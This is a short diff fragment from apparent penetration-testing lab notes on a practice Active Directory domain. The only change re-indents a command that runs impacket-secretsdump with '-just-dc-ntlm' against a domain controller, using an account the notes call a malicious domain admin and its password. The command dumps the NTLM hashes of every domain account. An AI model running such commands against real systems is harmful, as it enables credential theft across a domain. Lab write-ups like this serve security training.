@@ -32,4 +32,4 @@ using our malicious domain admin account hawkeye against the DC, we succesfully 
 
 Using -just-dc-ntlm with secrets dump  
 
-  impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138 -just-dc-ntlm
+    impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138 -just-dc-ntlm
